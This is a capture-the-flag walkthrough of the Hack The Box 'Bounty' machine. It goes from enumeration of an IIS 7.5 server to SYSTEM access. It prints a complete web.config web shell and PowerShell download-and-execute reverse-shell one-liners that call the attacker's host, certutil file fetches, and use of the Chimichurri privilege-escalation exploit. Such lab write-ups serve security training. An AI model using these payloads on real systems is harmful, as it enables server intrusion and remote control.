# Hackthebox Bounty

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -A -T4 -p- 10.10.10.93                       
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 03:16 EST
Nmap scan report for 10.10.10.93
Host is up (0.035s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Nmap vulnerability scan does not give anything.

Search for directories reveals only one directory, to which we don't have access credentials for.

```
$ gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                  1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/30 03:23:17 Starting gobuster in directory enumeration mode
===============================================================
/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]
/uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
```

Always scan for aspx-files when IIS

```
$ gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx                    130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx
[+] Timeout:                 10s
===============================================================
2021/12/30 05:07:35 Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/*checkout*.aspx      (Status: 400) [Size: 11] 
/*docroot*.aspx       (Status: 400) [Size: 11] 
/*.aspx               (Status: 400) [Size: 11] 
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
/http%3A.aspx         (Status: 400) [Size: 11] 
/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]
/q%26a.aspx           (Status: 400) [Size: 11]                                         
/**http%3a.aspx       (Status: 400) [Size: 11]                                         
/*http%3A.aspx        (Status: 400) [Size: 11]                                         
/uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]
/**http%3A.aspx       (Status: 400) [Size: 11]                                         
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 11]                                    
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 11]                                      
/http%3A%2F%2Fblog.aspx (Status: 400) [Size: 11]                                       
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]                                      
/s%26p.aspx           (Status: 400) [Size: 11]                                         
/%3FRID%3D2671.aspx   (Status: 400) [Size: 11]                                         
/devinmoore*.aspx     (Status: 400) [Size: 11]                                         
/children%2527s_tent.aspx (Status: 400) [Size: 11]                                     
/Wanted%2e%2e%2e.aspx (Status: 400) [Size: 11]                                         
/How_to%2e%2e%2e.aspx (Status: 400) [Size: 11]                                         
/200109*.aspx         (Status: 400) [Size: 11]                                         
/*sa_.aspx            (Status: 400) [Size: 11]                                         
/*dc_.aspx            (Status: 400) [Size: 11]                                         
/help%2523drupal.aspx (Status: 400) [Size: 11]                                         
/http%3A%2F%2Fcommunity.aspx (Status: 400) [Size: 11]                                  
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct.aspx (Status: 400) [Size: 11]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29.aspx (Status: 400) [Size: 11]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt.aspx (Status: 400) [Size: 11]                   
/http%3A%2F%2Fradar.aspx (Status: 400) [Size: 11]                                                             
/q%26a2.aspx          (Status: 400) [Size: 11]                                                                
/login%3f.aspx        (Status: 400) [Size: 11]                                                                
/Shakira%20Oral%20Fixation%201%20%26%202.aspx (Status: 400) [Size: 11]                                        
/%22julie%20roehm%22.aspx (Status: 500) [Size: 3026]                                                          
/%22james%20kim%22.aspx (Status: 500) [Size: 3026]                                                            
/%22britney%20spears%22.aspx (Status: 500) [Size: 3026]                                                       
/http%3A%2F%2Fjeremiahgrossman.aspx (Status: 400) [Size: 11]                                                  
/http%3A%2F%2Fweblog.aspx (Status: 400) [Size: 11]                                                            
/http%3A%2F%2Fswik.aspx (Status: 400) [Size: 11]                                                              
                                                                                                              
===============================================================
2021/12/30 05:16:34 Finished
===============================================================
```

### Vulnerability scanning

#### Short name scanning

IIS 7.5 is vulnerable for short name scanning. Verify it first using Metasploit.

```
$ msfconsole -q                                              
msf6 > use auxiliary/scanner/http/iis_
use auxiliary/scanner/http/iis_internal_ip        use auxiliary/scanner/http/iis_shortname_scanner  
msf6 > use auxiliary/scanner/http/iis_shortname_scanner 
msf6 auxiliary(scanner/http/iis_shortname_scanner) > show actoins
[-] Invalid parameter "actoins", use "show -h" for more information
msf6 auxiliary(scanner/http/iis_shortname_scanner) > show actions

Auxiliary actions:

   Name  Description
   ----  -----------


msf6 auxiliary(scanner/http/iis_shortname_scanner) > show options

Module options (auxiliary/scanner/http/iis_shortname_scanner):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       The base path to start scanning from
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  20               yes       Number of threads to use
   VHOST                     no        HTTP server virtual host

msf6 auxiliary(scanner/http/iis_shortname_scanner) > set rhosts 10.10.10.93
rhosts => 10.10.10.93
msf6 auxiliary(scanner/http/iis_shortname_scanner) > run
[*] Running module against 10.10.10.93

[*] Scanning in progress...
[+] Found 2 directories
[+] http://10.10.10.93/aspnet*~1
[+] http://10.10.10.93/upload*~1
[+] Found 2 files
[+] http://10.10.10.93/csaspx*~1.cs*
[+] http://10.10.10.93/transf*~1.asp*
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/iis_shortname_scanner) > 
```

And then with a short name scanner script, credits go to https://github.com/irsdl/iis-shortname-scanner/tree/master/.

Verify the target is vulnerable

```
$ java -jar iis_shortname_scanner.jar http://10.10.10.93
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by IISShortNameScanner.IIS_ShortName_Scanner (file:/home/kali/Documents/CTF/hackthebox/Bounty/IIS-ShortName-Scanner/iis_shortname_scanner.jar) to field java.net.HttpURLConnection.method
WARNING: Please consider reporting this to the maintainers of IISShortNameScanner.IIS_ShortName_Scanner
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/12/30 04:09:18
Target: http://10.10.10.93/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 11
```

And then run the script

```
$ java -jar iis_shortname_scanner.jar 2 20 http://10.10.10.93
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
magicFileName: *~1*
requestMethodDelimiter: ,
requestMethod: DEBUG,OPTIONS,GET,POST,HEAD,TRACE
nameStartsWith: 
extStartsWith: 
hassleFree: true
cookies: IIS_Tilde_Scanner=1;
outputFile: iis_shortname_scanner_logfile.txt
proxyServerName: 
acceptableDifferenceLengthBetweenResponses: 10
proxyServerPort: 
magicFinalPartList: \a.aspx,\a.asp,/a.aspx,/a.asp,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,/webresource.axd,/a.xxx
headersDelimiter: @@
saveOutput: false
maxNumericalPart: 3
headers: X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1
useProvidedURLWithoutChange: false
debug: false
maxConnectionTimeOut: 20000
magicFinalPartDelimiter: ,
forceNumericalPart: 1
userAgent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10
inScopeCharacters: ETAONRISHDLFCMUGYPWBVKJXQZ0123456789_-$~()&!#%'@^`{}
asteriskSymbol: *
showActualNames: true
maxRetryTimes: 10
maxDelayAfterEachRequest: 1
magicFileExtension: *
URLSuffix: ?&aspxerrorpath=/
questionMarkSymbol: ?

-- Current Configuration -- Begin
Scan Mode: ALL
Number of threads: 20
Config file: config.xml
Scanner version: 2.3.9 (05 February 2017)
-- Current Configuration -- End
Max delay after each request in milliseconds = 1
No proxy has been used.

Scanning...

Testing request method: "DEBUG" with magic part: "\a.aspx" ...
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by IISShortNameScanner.IIS_ShortName_Scanner (file:/home/kali/Documents/CTF/hackthebox/Bounty/IIS-ShortName-Scanner/iis_shortname_scanner.jar) to field java.net.HttpURLConnection.method
WARNING: Please consider reporting this to the maintainers of IISShortNameScanner.IIS_ShortName_Scanner
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
Testing request method: "OPTIONS" with magic part: "\a.aspx" ...
Dir: ASPNET~1			
Dir: UPLOAD~1P			
File: CSASPX~1.CS		
File: CSASPX~1.CS?? - possible network/server problem		
File: TRANSF~1.ASP		
[/] TRANSF~1.ASS		
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/12/30 04:10:48
Target: http://10.10.10.93/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 555
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Indentified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

If needed we could create a file name bruteforce list with crunch, but now we don't need it, we know the file is transfer.aspx.

#### web.config command execution

Good explanation: https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

A web.config file lets you customize the way your site or a specific directory on your site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.

### Initial Access

Initial access can be gained by uploading a web.config with a web shell

```
$ cat web.config            
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
	       <remove fileExtension=".aspx" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
	       <remove segment="shell.aspx" />
	       <remove segment="shell.jpg" />
               <remove segment="bin" />
               <remove segment="App_code" />
               <remove segment="App_GlobalResources" />
               <remove segment="App_LocalResources" />
               <remove segment="App_Browsers" />
               <remove segment="App_WebReferences" />
               <remove segment="App_Data" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's location:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>


<%Response.write("<!-"&"-") %>
-->
```

Using this script we can execute cmd commands such as dir as a user merlin.

A reverse shell can be established using powercat.ps1: https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

Set up a web server to fetch the script and listener for the reverse shell. Execute then the powershell command using the web shell we have established with the web.config.

```
$ python -m http.server 4444 
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.10.93 - - [30/Dec/2021 09:29:21] "GET /powercat.ps1 HTTP/1.1" 200 -

$ nc -nvlp 6666                                           
listening on [any] 6666 ...

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:4444/powercat.ps1');powercat -c 10.10.14.3 -p 6666 -e cmd"
```

And we get the reverse shell

```
c:\>whoami
whoami
bounty\merlin
```

### Privilege Escalation

The host we have is not patched

```
c:\>systeminfo
systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          12/30/2021, 4:24:55 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,586 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,588 MB
Virtual Memory: In Use:    507 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

```
c:\>wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn

No Instance(s) Available.
```

Transfer winPEAS from our host

```
c:\Windows\Temp>certutil -urlcache -split -f "http://10.10.14.3:4444/winPEASx64.exe" winPEASx64.exe
certutil -urlcache -split -f "http://10.10.14.3:4444/winPEASx64.exe" winPEASx64.exe
****  Online  ****
  000000  ...
  1d7600
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>


c:\Windows\Temp>certutil -urlcache -split -f "http://10.10.14.3:4444/winPEAS.bat" winPEAS.bat
certutil -urlcache -split -f "http://10.10.14.3:4444/winPEAS.bat" winPEAS.bat
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>
```

Neither of those seem to work.

Windows exploit suggester NG (https://github.com/bitsadmin/wesng) shows us 207 vulnerabilities.

We also verify our SeImpersonatePrivilege status, which is enabled

```
:\Windows\Temp>whoami /priv 
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
#### MS10-059 (CVE-2010-2554)

A Chimichurri exploit used also in other boxes.

```
c:\Windows\Temp>Chimichurri2.exe
Chimichurri2.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
c:\Windows\Temp>Chimichurri2.exe 10.10.14.3 7777
Chimichurri2.exe 10.10.14.3 7777
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
c:\Windows\Temp>
```

And we have root

```
$ nc -nvlp 7777                                           
listening on [any] 7777 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Windows\Temp>whoami
whoami
nt authority\system

c:\Windows\Temp>dir c:\users\administrator\desktop\root.txt
dir c:\users\administrator\desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of c:\users\administrator\desktop

05/30/2018  11:18 PM                32 root.txt
               1 File(s)             32 bytes
               0 Dir(s)  11,879,153,664 bytes free

c:\Windows\Temp>
```

Now, we skipped user flag earlier, as it does not seem to be visible in the typical directory. Thought that I would see it as a root, but seems it is hidden and needs PowerShell to get it visible. As firing up powershell from the cmd hangs up, better to start creating the initial reverse shell through powershell. And for that we use Nishang shell (https://github.com/samratashok/nishang/tree/master/Shells)

```
$ cat web.config             
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.3:4444/Invoke-PowerShellTcp.ps1')")
%>
```

As this command only downloads the file to the target host, we need to append the Invoke-PowerShellTcp.ps1 with

```
        Write-Error $_
    }
}

Invoke-PowerShellTCP -Reverse -IPAddress 10.10.14.3 -Port 6666
```

Then setting up the server to fetch the file and listener for reverse shell

```
$ python -m http.server 4444 
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.10.93 - - [30/Dec/2021 11:44:28] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

 nc -nvlp 6666                                                                                                                                                                        1 ⨯
listening on [any] 6666 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49160
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv> 
```

Now we have a powershell and can finally see the user flag

```
PS C:\users\merlin\desktop> dir
PS C:\users\merlin\desktop> dir -force


    Directory: C:\users\merlin\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-a-h-         5/30/2018  11:32 PM         32 user.txt
```

